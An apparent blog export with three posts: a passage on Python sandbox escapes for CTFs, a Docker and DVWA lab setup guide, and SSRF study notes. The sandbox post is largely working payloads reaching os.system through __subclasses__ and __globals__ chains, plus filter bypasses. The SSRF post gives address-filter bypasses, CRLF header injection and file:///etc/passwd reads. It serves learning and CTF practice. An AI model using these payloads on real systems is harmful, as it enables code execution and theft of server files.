在 2.x 版本中，内建模块被命名为 __builtin__，到了 3.x 就成了 builtins。它们都需要 import 才能查看：2.x：
&gt;&gt;&gt; import __builtin__&gt;&gt;&gt; __builtin__&lt;module &#x27;__builtin__&#x27; (built-in)&gt;

3.x：
&gt;&gt;&gt; import builtins&gt;&gt;&gt; builtins&lt;module &#x27;builtins&#x27; (built-in)&gt;

但是，__builtins__ 两者都有，实际上是__builtin__和builtins 的引用。它不需要导入，我估计是为了统一 2.x 和 3.x。不过__builtins__与__builtin__和builtins是有一点区别的，感兴趣的话建议查一下，这里就不啰嗦了。不管怎么样，__builtins__ 相对实用一点，并且在 __builtins__里有很多好东西：
&gt;&gt;&gt; &#x27;__import__&#x27; in dir(__builtins__)True&gt;&gt;&gt; __builtins__.__dict__[&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;whoami&#x27;)macr0phag30&gt;&gt;&gt; &#x27;eval&#x27; in dir(__builtins__)True&gt;&gt;&gt; &#x27;execfile&#x27; in dir(__builtins__)True

（不知为何我在pycharm自带的控制台里面运行就不行，但是自己写脚本的话就可以）
这里稍微解释下 x.__dict__ ，它是 x 内部所有属性名和属性值组成的字典，有以下特点：

内置的数据类型没有 __dict__ 属性
每个类有自己的 __dict__ 属性，就算存着继承关系，父类的 __dict__ 并不会影响子类的 __dict__
对象也有自己的 __dict__ 属性，包含 self.xxx 这种实例属性

那么既然__builtins__有这么多危险的函数，不如将里面的危险函数破坏了：
__builtins__.__dict__[&#x27;eval&#x27;] = &#x27;not allowed&#x27;

或者直接删了：
del __builtins__.__dict__[&#x27;eval&#x27;]

但是我们可以利用 reload(__builtins__) 来恢复 __builtins__。不过，我们在使用 reload 的时候也没导入，说明 reload也在 __builtins__里，那如果连reload都从__builtins__中删了，就没法恢复__builtins__了，需要另寻他法。还有一种情况是利用 exec command in _global 动态运行语句时的绕过，比如实现一个计算器的时候，在最后有给出例子。
这里注意，2.x 的 reload 是内建的，3.x 需要 import imp，然后再 imp.reload。你看，reload 的参数是 module，所以肯定还能用于重新载入其他模块
通过继承关系逃逸在 Python 中提到继承就不得不提 mro，mro就是方法解析顺序，因为 Python 支持多重继承，所以就必须有个方式判断某个方法到底是 A 的还是 B 的。.__mro__ 或 .mro()，是个元组，记录了继承关系：
&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__(&lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)

类的实例在获取 __class__ 属性时会指向该实例对应的类。可以看到，&#39;&#39;属于 str类，它继承了 object 类，这个类是所有类的超类。具有相同功能的还有__base__和__bases__。需要注意的是，经典类需要指明继承 object 才会继承它，否则是不会继承的：
&gt;&gt;&gt; class test:...     pass...&gt;&gt;&gt; test.__bases__()&gt;&gt;&gt; class test(object):...     pass...&gt;&gt;&gt; test.__bases__(&lt;type &#x27;object&#x27;&gt;,)

那么知道这个有什么用呢？
由于没法直接引入 os，那么假如有个库叫oos，在oos中引入了os，那么我们就可以通过__globals__拿到 os。例如，site 这个库就有 os：
&gt;&gt;&gt; import site&gt;&gt;&gt; site.os&lt;module &#x27;os&#x27; from &#x27;/Users/macr0phag3/.pyenv/versions/3.6.5/lib/python3.6/os.py&#x27;&gt;

怎么理解这个 __globals__ 呢？它是函数所在的全局命名空间中所定义的全局变量。也就是只要是函数就会有这个属性。除了 builtin_function_or_method 或者是 wrapper_descriptor 、method-wrapper 类型的函数，例如 range、range.__init__、&#39;&#39;.split 等等。
那么也就是说，能引入 site 的话，就相当于有 os。那如果 site 也被禁用了呢？没事，本来也就没打算直接 import site。可以利用 reload，变相加载 os：
&gt;&gt;&gt; import site&gt;&gt;&gt; osTraceback (most recent call last):  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;NameError: name &#x27;os&#x27; is not defined&gt;&gt;&gt; os = reload(site.os)&gt;&gt;&gt; os.system(&#x27;whoami&#x27;)macr0phag30

还有，既然所有的类都继承的object，那么我们先用__subclasses__看看它的子类（我的另一篇博客ssti学习中有相关知识）
以 2.x 的site._Printer为例（py3.x 中已经移除了这里 __globals__ 的 os）：
&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__[&#x27;os&#x27;]&lt;module &#x27;os&#x27; from &#x27;/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc&#x27;&gt;&gt;&gt;&gt; # 为了避免 index 位置问题，可以这样写：&gt;&gt;&gt; [i._Printer__setup.__globals__[&#x27;os&#x27;] for i in &#x27;&#x27;.__class__.__mro__[-1].__subclasses__() if i.__name__ == &quot;_Printer&quot;]&lt;module &#x27;os&#x27; from &#x27;/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc&#x27;&gt;

os 又回来了。并且 site 中还有 __builtins__。
这个方法不仅限于 A-&gt;os，还阔以是 A-&gt;B-&gt;os，比如 2.x 中的 warnings：
&gt;&gt;&gt; import warnings&gt;&gt;&gt; &gt;&gt;&gt; warnings.osTraceback (most recent call last):  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;AttributeError: &#x27;module&#x27; object has no attribute &#x27;os&#x27;&gt;&gt;&gt; &gt;&gt;&gt; warnings.linecache&lt;module &#x27;linecache&#x27; from &#x27;/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/linecache.pyc&#x27;&gt;&gt;&gt;&gt;&gt;&gt;&gt; warnings.linecache.os&lt;module &#x27;os&#x27; from &#x27;/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc&#x27;&gt;

在继承链中就可以这样（py3.x 中已经移除了这里 __globals__ 的 linecache）：
&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;].system(&#x27;whoami&#x27;)macr0phag30&gt;&gt;&gt; # 为了避免 index 位置问题，可以这样写：&gt;&gt;&gt; [i.__init__.__globals__[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;].system(&#x27;whoami&#x27;) for i in &#x27;&#x27;.__class__.__mro__[-1].__subclasses__() if i.__name__ == &quot;catch_warnings&quot;]

顺便说一下，warnings这个库中有个函数：warnings.catch_warnings，它有个_module属性：
    def __init__(self, record=False, module=None):...        self._module = sys.modules[&#x27;warnings&#x27;] if module is None else module...

所以通过_module也可以构造 payload（py3.x 中已经移除了 catch_warnings 的 linecache）：
&gt;&gt;&gt; [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == &#x27;catch_warnings&#x27;][0]()._module.linecache.os.system(&#x27;whoami&#x27;)macr0phag30

3.x 中的warnings虽然没有 linecache，也有__builtins__
同样，py3.x 中有&lt;class &#39;os._wrap_close&#39;&gt;，利用方式可以为：
&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[133].__init__.__globals__[&#x27;system&#x27;](&#x27;whoami&#x27;)macr0phag30&gt;&gt;&gt; # 为了避免 index 位置问题，可以这样写：&gt;&gt;&gt; [i for i in &#x27;&#x27;.__class__.__mro__[-1].__subclasses__() if i.__name__ == &quot;_wrap_close&quot;][0].__init__.__globals__[&#x27;system&#x27;](&#x27;whoami&#x27;)

当然这样也是可以的（3.x）：
set.mro()[-1].__subclasses__()[133].__init__.__globals__[&#x27;system&#x27;](&#x27;whoami&#x27;)

顺便提一下，object 本来就是可以使用的，如果没过滤的话，payload 可以再简化为：
object.__subclasses__()[133].__init__.__globals__[&#x27;system&#x27;](&#x27;whoami&#x27;)

还有一种是利用builtin_function_or_method 的 __call__：
&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval, &#x27;1+1&#x27;)

或者简单一点：
[].pop.__class__.__call__(eval, &#x27;1+1&#x27;)

上面这些 payload 大多数是直接 index 了，但是直接用 index 不太健壮，可以都换成列表推导式，用 __name__ 来获取想要的 class，上面也举了好几个例子了，这里就不多说啦。
最后再补充几个。
可以这样利用：
class test(dict):    def __init__(self):        print(super(test, self).keys.__class__.__call__(eval, &#x27;1+1&#x27;))        # 如果是 3.x 的话可以简写为：        # super().keys.__class__.__call__(eval, &#x27;1+1&#x27;))test()

还可以利用异常逃逸：
hack = lambda : [0][1]try:    hack()except Exception as e:    e.__traceback__.tb_next.tb_frame.f_globals[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;whoami&#x27;)

还可以利用 format：

&quot;&#123;0.__class__.__base__&#125;&quot;.format([])
&quot;&#123;x.__class__.__base__&#125;&quot;.format(x=[])
&quot;&#123;.__class__.__base__&#125;&quot;.format([])
(&quot;&#123;0.__class_&quot;+&quot;_.__base__&#125;&quot;).format([])

（这里顺手记录下，对于字典键是整数型的比如 &#123;&quot;1&quot;:2&#125;，format 是无法拿到值的 :)，这样会报错：&#39;&#39;&#39; &#123;0[&#39;1&#39;]&#125; &#39;&#39;&#39;.format(&#123;&quot;1&quot;:2&#125;)，&#39;1&#39; 引号去掉的话又会报没有这个键，这个特性可以见文档）
上面的这些利用方式总结起来就是通过 .mro()、__class__、type(...)、__mro__、__subclasses__、__base__、__bases__ 等属性&#x2F;方法去获取 object，再根据__globals__找引入的__builtins__或者eval等等能够直接被利用的库，或者找到builtin_function_or_method类&#x2F;类型__call__后直接运行eval
文件读写2.x 有个内建的 file：
&gt;&gt;&gt; file(&#x27;key&#x27;).read()&#x27;Macr0phag3\n&#x27;&gt;&gt;&gt; file(&#x27;key&#x27;, &#x27;w&#x27;).write(&#x27;Macr0phag3&#x27;)&gt;&gt;&gt; file(&#x27;key&#x27;).read()&#x27;Macr0phag3&#x27;

还有个 open，2.x 与 3.x 通用。
还有一些库，例如：types.FileType(rw)、platform.popen(rw)、linecache.getlines(r)。
为什么说写比读危害大呢？因为如果能写，可以将类似的文件保存为math.py，然后 import 进来：math.py：
import osprint(os.system(&#x27;whoami&#x27;))

调用
&gt;&gt;&gt; import mathmacr0phag30

这里需要注意的是，这里 py 文件命名是有技巧的。之所以要挑一个常用的标准库是因为过滤库名可能采用的是白名单。并且之前说过有些库是在sys.modules中有的，这些库无法这样利用，会直接从sys.modules中加入，比如re：
&gt;&gt;&gt; &#x27;re&#x27; in sys.modulesTrue&gt;&gt;&gt; &#x27;math&#x27; in sys.modulesFalse

当然在import re 之前del sys.modules[&#39;re&#39;]也不是不可以…
最后，这里的文件命名需要注意的地方和最开始的那个遍历测试的文件一样：由于待测试的库中有个叫 test的，如果把遍历测试的文件也命名为 test，会导致那个文件运行 2 次，因为自己 import 了自己。
读文件暂时没什么发现特别的地方。
剩下的就是根据上面的执行系统命令采用的绕过方法去寻找 payload 了，比如：
&gt;&gt;&gt; __builtins__.open(&#x27;key&#x27;).read()&#x27;Macr0phag3\n&#x27;

或者
&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[40](&#x27;key&#x27;).read()&#x27;Macr0phag3&#x27;

敏感信息泄露这个也算只能读吧。

dir()

__import__(&quot;__main__&quot;).x，其中 __main__ 还会泄露脚本的绝对路径：&lt;module &#39;__main__&#39; from &#39;xxx.py&#39;&gt;

__file__，文件绝对路径

x.__dict__

locals()

globals()

vars()

sys._getframe(0).f_code.co_varnames：
用于获取当前执行代码块的局部变量名称列表：

sys._getframe(0): 这是一个调用 sys 模块中的 _getframe() 函数的示例。_getframe() 函数用于访问调用栈的帧对象，参数 0 表示获取当前帧（即调用该语句的帧）。
.f_code: 这是帧对象的一个属性，代表正在执行的代码的代码对象。
.co_varnames: 这是代码对象的一个属性，包含了当前代码块的局部变量名称列表


sys._getframe(0).f_locals：
用于获取当前执行代码块的局部变量字典：

sys._getframe(0): 这是一个调用 sys 模块中的 _getframe() 函数的示例。_getframe() 函数用于访问调用栈的帧对象，参数 0 表示获取当前帧（即调用该语句的帧）。
.f_locals: 这是帧对象的一个属性，包含了当前执行代码块的局部变量字典


inspect.x，inspect 有很多方法可以获取信息，比如获取源码可以用 inspect.getsource，还有其他很多的功能

…


绕过姿势过滤 [ ]应对的方式就是将[]的功能用pop、__getitem__ 代替（实际上a[0]就是在内部调用了a.__getitem__(0)）：
&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get(&#x27;linecache&#x27;).os.popen(&#x27;whoami&#x27;).read()&#x27;macr0phag3\n&#x27;

当然，dict 也是可以 pop 的：&#123;&quot;a&quot;: 1&#125;.pop(&quot;a&quot;)
当然也可以用 next(iter()) 替代，或许可以加上 max 之类的玩意。
过滤引号
chr

最简单就是用 chr 啦
os.system(    chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105))


扣字符

利用 str 和 []，挨个把字符拼接出来
os.system(    str(().__class__.__new__)[21]+str(().__class__.__new__)[13]+str(().__class__.__new__)[14]+str(().__class__.__new__)[40]+str(().__class__.__new__)[10]+str(().__class__.__new__)[3])

当然 [] 如果被过滤了也可以 bypass，前面说过了。
如果 str 被过滤了怎么办呢？type(&#39;&#39;)()、format() 即可。同理，int、list 都可以用 type 构造出来。

格式化字符串

那过滤了引号，格式化字符串还能用吗？
(chr(37)+str(&#123;&#125;.__class__)[1])%100 == &#x27;d&#x27;

又起飞了…

dict() 拿键它不香吗？

&#x27;whoami&#x27; ==list(dict(whoami=1))[0] ==str(dict(whoami=1))[2:8] ==

限制数字上面提到了字符串过滤绕过，顺便说一下，如果是过滤了数字（虽然这种情况很少见），那绕过的方式就更多了，我这里随便列下：

0：int(bool([]))、Flase、len([])、any(())
1：int(bool([&quot;&quot;]))、True、all(())、int(list(list(dict(a၁=())).pop()).pop())
获取稍微大的数字：len(str(&#123;&#125;.keys))，不过需要慢慢找长度符合的字符串
1.0：float(True)
-1：~0
…

其实有了 0 就可以了，要啥整数直接做运算即可：
0 ** 0 == 11 + 1 == 22 + 1 == 32 ** 2 == 4...

限制空格空格通常来说可以通过 ()、[] 替换掉。例如：
[i for i in range(10) if i == 5]` 可以替换为 `[[i][0]for(i)in(range(10))if(i)==5]

限制运算符&gt; &lt; ! - + 这几个比较简单就不说了。
== 可以用 in 来替换。
替换 or 的测试代码
for i in [(100, 100, 1, 1), (100, 2, 1, 2), (100, 100, 1, 2), (100, 2, 1, 1)]:    ans = i[0]==i[1] or i[2]==i[3]    print(bool(eval(f&#x27;&#123;i[0]==i[1]&#125; | &#123;i[2]==i[3]&#125;&#x27;)) == ans)    print(bool(eval(f&#x27;- &#123;i[0]==i[1]&#125; - &#123;i[2]==i[3]&#125;&#x27;)) == ans)    print(bool(eval(f&#x27;&#123;i[0]==i[1]&#125; + &#123;i[2]==i[3]&#125;&#x27;)) == ans)

上面这几个表达式都可以替换掉 or
替换 and 的测试代码
for i in [(100, 100, 1, 1), (100, 2, 1, 2), (100, 100, 1, 2), (100, 2, 1, 1)]:    ans = i[0]==i[1] and i[2]==i[3]    print(bool(eval(f&#x27;&#123;i[0]==i[1]&#125; &amp; &#123;i[2]==i[3]&#125;&#x27;)) == ans)    print(bool(eval(f&#x27;&#123;i[0]==i[1]&#125; * &#123;i[2]==i[3]&#125;&#x27;)) == ans)

上面这几个表达式都可以替换掉 and
过滤了 ()
利用装饰器 @
利用魔术方法，例如 enum.EnumMeta.__getitem__

f 字符串执行f 字符串算不上一个绕过，更像是一种新的攻击面，通常情况下用来获取敏感上下文信息,例如过去环境变量
&#123;whoami.__class__.__dict__&#125;&#123;whoami.__globals__[os].__dict__&#125;&#123;whoami.__globals__[os].environ&#125;&#123;whoami.__globals__[sys].path&#125;&#123;whoami.__globals__[sys].modules&#125;# Access an element through several links&#123;whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__&#125;

也可以直接 RCE
&gt;&gt;&gt; f&#x27;&#123;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#125;&#x27;kali&#x27;0&#x27;&gt;&gt;&gt; f&quot;&#123;__builtins__.__import__(&#x27;os&#x27;).__dict__[&#x27;popen&#x27;](&#x27;ls&#x27;).read()&#125;&quot;



























]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>云服务器部署Docker及搭建各类环境</title>
    <url>/2024/05/18/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2Docker%E5%8F%8A%E6%90%AD%E5%BB%BA%E5%90%84%E7%B1%BB%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[参考资料最详细的ubuntu 安装 docker教程：https://zhuanlan.zhihu.com/p/651148141?utm_id=0
docker搭建Dvwa靶场：https://juejin.cn/post/7076807703565336612

开始的开始让我们先更新一下apt
sudo apt-get updatesudo apt-get upgrade

部署Docker一. 卸载Ubuntu自带的Docker以下操作最好用管理员

注：docker的旧版本不一定被称为docker，http://docker.io 或 docker-engine也有可能，所以我们卸载的命令为：

apt-get remove docker docker-engine docker.io containerd runc

如果报错也正常，有些Ubuntu没有Docker，直接下一步
二.安装1.安装docker依赖
Docker在Ubuntu上依赖一些软件包。执行以下命令来安装这些依赖:
apt-get install ca-certificates curl gnupg lsb-release

2.添加Docker官方GPG密钥
执行以下命令来添加Docker官方的GPG密钥:
curl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -

3.添加Docker软件源
执行以下命令来添加Docker的软件源:
sudo add-apt-repository &quot;deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable&quot;

4.安装docker
执行以下命令来安装Docker:
apt-get install docker-ce docker-ce-cli containerd.io

5.配置用户组（可选）
默认情况下，只有root用户和docker组的用户才能运行Docker命令。我们可以将当前用户添加到docker组，以避免每次使用Docker时都需要使用sudo。命令如下：
sudo usermod -aG docker $USER

注：重新登录才能使更改生效。

接下来我们就可以测试一下看Docker有没有安装成功了
我们可以通过启动docker来验证我们是否成功安装。命令如下：
systemctl start docker

安装工具
apt-get -y install apt-transport-https ca-certificates curl software-properties-common

重启docker
service docker restart

验证是否成功
sudo docker run hello-world

因为我们之前没有拉取过hello-world，所以运行命令后会出现本地没有该镜像，并且会自动拉取的操作
查看镜像（image）
docker images

出现了hello-world的镜像即可
查看版本
我们可以通过下面的命令来查看docker的版本
sudo docker version

搭建DVWA靶场一. 准备工作开端口：
打开控制台，安全组的管理规则开一个端口，假设为1314。然后连上服务器（我使用xshell）
启动Docker：
systemctl start docker

二.拉取image找image（镜像）
docker search dvwa

选一个image拉取：
docker pull citizenstig/dvwa

三. 布置容器docker images  //查看镜像docker run --name Dvwa -d -p 9320:80  citizenstig/dvwa  //布置容器-p：指定映射端口-d：后台运行--name：容器命名为XXX

我端口是9320，后面的80不能改，容器里的php服务默认跑在80端口。
四. 后续在网页上打开，创建数据库，账户密码输入admin，password即可。
删除容器和镜像先删除正在运行的容器查看正在运行的容器：
docker ps

停止正在运行的容器：
docker stop &lt;容器ID或名称&gt;

删除目标容器：
docker rm  &lt;容器ID或名称&gt;

再删除目标镜像查看镜像：
docker images

删除镜像：
docker rmi IMAGE_ID

搭建CTF题目环境一. 上传项目到服务器个人使用WinSCP，优点是可视化比较好，微软的可视化一向比较nice。自己mkdir一个目录储存项目即可。
二. 构建Docker镜像在 Dockerfile 所在目录下，打开终端或命令提示符，执行以下命令来构建 Docker 镜像：
docker build -t your-app-name .


这里的 your-app-name 是你给你的 Docker 镜像起的名字，. 指的是当前目录，即 Dockerfile 所在的目录。

]]></content>
      <categories>
        <category>服务器</category>
      </categories>
  </entry>
  <entry>
    <title>ssrf学习</title>
    <url>/2024/03/19/ssrf%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[SSRF（Server Side Request Forgery服务端请求伪造），是一种由攻击者构造但是由服务端发起请求的一个安全漏洞。SSRF的攻击目标一般是从外网无法访问的内部服务器。
SSRF漏洞的原理
SSRF漏洞原理
（1）攻击者可以通过公网访问到某个web服务器；
（2）但是攻击者是无法通过公网访问到内网的其他设备或者办公区域；
（3）这时候如果想进行内网探测，web服务器同时存在SSRF漏洞，就能以web服务器作为跳板，进而攻击其他服务器或区域


SSRF利用的条件：
（1）web服务器存在SSRF漏洞；
（2）web服务器有访问本地或远程服务器的权限；

SSRF存在的位置：一般是web服务器提供了从其他服务器获取数据的功能。
（1） 分享功能：通过URL地址分享文章等，例如如下地址：
http://share.xxx.com/index.php?url=http://www.xxx.com

通过url参数的获取来实现点击链接的时候跳到指定的分享文章。如果在此功能中没有对目标地址的范围做过滤与限制则就存在着SSRF漏洞。
（2）图片加载&#x2F;下载：通过URL地址加载或下载图片：
http://image.xxx.com/image.php?image=http://www.xxx.com

图片加载存在于很多的编辑器中，编辑器上传图片处加载设定好的远程服务器上的图片地址，如果没对加载的参数做限制可能造成SSRF。
（3）图片&#x2F;文章收藏功能：
http://title.xxx.com/title?title=http://title.xxx.com/xxx

例如 title参数是文章的标题地址，代表了一个文章的地址链接，如果收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。
（4）转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览。
（5）在线翻译：给网址翻译对应网页的内容。
（6）邮件系统：比如接收邮件服务器地址。
（7）利用参数中的关键字查找：
关键字：
share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain...

总的来说，需要从远程服务器请求资源的网站都有可能存在SSRF漏洞

SSRF的挖掘，看URL是否有关键字“XX=”
Share、wap、url、link、src、source、target、u、3g、display、 sourceURL、imageURL、domain

5.漏洞验证:
因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们可以通过抓包分析发送的请求是否是由服务器端发送的来判断是否存在SSRF漏洞。
在页面源码中查找访问的资源地址，如果该资源地址类型为http://www.xxx.com/a.php?image=地址就可能存在SSRF漏洞。


回环地址127.0.0.0&#x2F;8 网络范围: 127.0.0.1 是环回地址（loopback address），用于本地机器的网络测试和通信。实际上，整个 127.0.0.0&#x2F;8 的 IP 范围（即从 127.0.0.0 到 127.255.255.255）都被保留用于环回功能。这意味着，所有 127.x.x.x 的地址都指向本地机器。
默认网关的简化: 在 IP 地址表示中，省略末尾的零并保留最后的部分是一种简化形式。例如，127.1 实际上是 127.0.0.1 的简写，系统会自动补全缺失的部分。因此，127.1 等同于 127.0.0.1。
内部路由机制: 当系统处理 127.x.x.x 地址时，它知道这些地址是保留给本地回环使用的，而不需要通过任何外部网络路由。因此，127.1 和 127.0.0.1 都会被识别为指向本地机器的地址。
绕过方法部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下：
1、绕过限制为某种域名：（1）利用@，当网站限制只能访问 http://www.xxx.com类型的域名时，可以采用http基本身份认证的方式绕过，如：http://www.xxx.com@www.xxc.com
在对@解析域名中，不同的处理函数存在处理差异，例如：
http://www.aaa.com@www.bbb.com@www.ccc.com

在PHP的parse_url中会识别 www.ccc.com，而libcurl则识别为 www.bbb.com。
2、绕过限制请求IP不为内网地址：（1）采用短网址绕过：比如百度短地址https://dwz.cn/
（2）利用特殊域名，xip.io可以指向任意域名（原理是DNS解析），即 127.0.0.1.xip.io，可以解析为127.0.0.1
（3）采用进制转换，127.0.0.1 八进制：0177.0.0.1；十六进制：0x7f.0.0.1；十进制：2130706433
（4）利用[::]，可以利用[::]来绕过localhost，比如：http://[::]:80/ 会解析为 http://127.0.0.1
（5）添加端口号，http://127.0.0.1:8080
（6）利用句号，127。0。0。1 会解析为 127.0.0.1
（7）采用跳转：常用的跳转有302跳转和307跳转，区别在于307跳转会转发POST请求中的数据等，但是302跳转不会
（8）CRLF 编码绕过

%0d-&gt;0x0d-&gt;\r回车%0a-&gt;0x0a-&gt;\n换行进行HTTP头部注入

example.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a 

（9）利用封闭的字母数字
利用Enclosed alphanumericsⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.comhttp://169.254.169.254&gt;&gt;&gt;http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]List:① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿

3、限制请求只为http协议：（1）采用跳转：常用的跳转有302跳转和307跳转，区别在于307跳转会转发POST请求中的数据等，但是302跳转不会
（2）采用短地址
DNS Rebinding一个常用的防护思路是：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就禁止该次请求。
但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，可以进行DNS重绑定攻击。
要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：

服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP
对于获得的IP进行判断，发现为非黑名单IP，则通过验证
服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。
由于已经绕过验证，所以服务器端返回访问内网资源的结果。

利用IPv6有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 [::] 0000::1 或IPv6的内网域名来绕过过滤，与IPv4的回环地址 127.0.0.1 类似
curl http://[::1]/

漏洞利用产生漏洞的函数：根据后台使用的函数的不同，相应的影响和利用方法也不一样，PHP中下面函数的使用不当会导致SSRF:
file_get_contents()fsockopen()curl_exec()       

file_get_contents()
这个函数的作用是将整个文件读入一个字符串中，并且此函数是用于把文件的内容读入到一个字符串中的首选方法。
比如：下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。
&lt;?phpif (isset($_POST[&#x27;url&#x27;])) &#123; $content = file_get_contents($_POST[&#x27;url&#x27;]); $filename =&#x27;./images/&#x27;.rand().&#x27;;img1.jpg&#x27;; file_put_contents($filename, $content); echo $_POST[&#x27;url&#x27;]; $img = &quot;&lt;img src=\&quot;&quot;.$filename.&quot;\&quot;/&gt;&quot;; &#125; echo $img; ?&gt;

sockopen()
使用fsockopen函数实现获取用户制定url的数据（文件或者html)
以下代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。
&lt;?php function GetFile($host,$port,$link) &#123; $fp = fsockopen($host, intval($port), $errno, $errstr, 30); if (!$fp) &#123; echo &quot;$errstr (error number $errno) \n&quot;; &#125; else &#123; $out = &quot;GET $link HTTP/1.1\r\n&quot;; $out .= &quot;Host: $host\r\n&quot;; $out .= &quot;Connection: Close\r\n\r\n&quot;; $out .= &quot;\r\n&quot;; fwrite($fp, $out); $contents=&#x27;&#x27;; while (!feof($fp)) &#123; $contents.= fgets($fp, 1024); &#125; fclose($fp); return $contents; &#125; &#125;?&gt;

curl_exec()
该函数可以执行给定的curl会话
cURL这是另一个非常常见的实现，它通过 PHP获取数据。文件&#x2F;数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。
&lt;?php if (isset($_POST[&#x27;url&#x27;]))&#123;$link = $_POST[&#x27;url&#x27;];$curlobj = curl_init();curl_setopt($curlobj, CURLOPT_POST, 0);curl_setopt($curlobj,CURLOPT_URL,$link);curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($curlobj);curl_close($curlobj);$filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;;file_put_contents($filename, $result); echo $result;&#125;?&gt;


注意事项
注意事项
一般情况下PHP不会开启fopen的gopher wrapperfile_get_contents的gopher协议不能URL编码file_get_contents关于Gopher的302跳转会出现bug，导致利用失败curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用curl_exec() 默认不跟踪跳转，file_get_contents() file_get_contents支持php://input协议

url伪协议ctfhub伪协议读取文件(file:&#x2F;&#x2F;)这种URL Schema可以尝试从文件系统中获取文件：
http://example.com/ssrf.php?url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini

如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制：
